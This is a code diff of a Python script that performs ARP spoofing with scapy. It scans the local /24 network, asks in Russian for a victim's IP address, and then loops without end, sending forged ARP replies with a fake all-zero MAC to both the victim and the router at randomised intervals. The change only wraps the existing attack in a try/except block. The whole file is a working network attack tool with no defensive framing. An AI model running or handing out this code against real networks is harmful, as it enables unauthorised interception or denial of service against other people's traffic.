@@ -1,29 +1,31 @@
 import time
 import random
-
-import scapy.all as scapy
-wifiadapter = "adapter_name.wifi"
-if wifiadapter != "adapter_name.wifi":
-	scapy.conf.iface = wifiadapter
-
-ip_range = f'{scapy.conf.route.route("0.0.0.0")[2]}/24'
-
-scapy.arping(ip_range,10)
-def poison(target, router, targetMAC):
-    arp_reply = scapy.ARP(pdst=target, hwdst=targetMAC, psrc=router, hwsrc=FAKE_MAC, op=2)
-    scapy.send(arp_reply, verbose=0)
-
-FAKE_MAC = "00:00:00:00:00:00"
-target = input('Введите ip адрес жертвы (пример: X.X.X.X): ')
-router = scapy.conf.route.route("0.0.0.0")[2]
-
-
-
-while 1:
-
-  targetMAC = str(scapy.getmacbyip(target))
-  routerMAC = str(scapy.getmacbyip(router))
-  print("[ARP] -",targetMAC,routerMAC)
-  poison(target, router, targetMAC)
-  poison(router,target, routerMAC)
-  time.sleep(random.uniform(0.3, 1.7))
+try:
+    import scapy.all as scapy
+    wifiadapter = "adapter_name.wifi"
+    if wifiadapter != "adapter_name.wifi":
+        scapy.conf.iface = wifiadapter
+    
+    ip_range = f'{scapy.conf.route.route("0.0.0.0")[2]}/24'
+    
+    scapy.arping(ip_range,10)
+    def poison(target, router, targetMAC):
+        arp_reply = scapy.ARP(pdst=target, hwdst=targetMAC, psrc=router, hwsrc=FAKE_MAC, op=2)
+        scapy.send(arp_reply, verbose=0)
+    
+    FAKE_MAC = "00:00:00:00:00:00"
+    target = input('Введите ip адрес жертвы (пример: X.X.X.X): ')
+    router = scapy.conf.route.route("0.0.0.0")[2]
+    
+    
+    
+    while 1:
+    
+      targetMAC = str(scapy.getmacbyip(target))
+      routerMAC = str(scapy.getmacbyip(router))
+      print("[ARP] -",targetMAC,routerMAC)
+      poison(target, router, targetMAC)
+      poison(router,target, routerMAC)
+      time.sleep(random.uniform(0.3, 1.7))
+except Exception as e:
+    print(e)
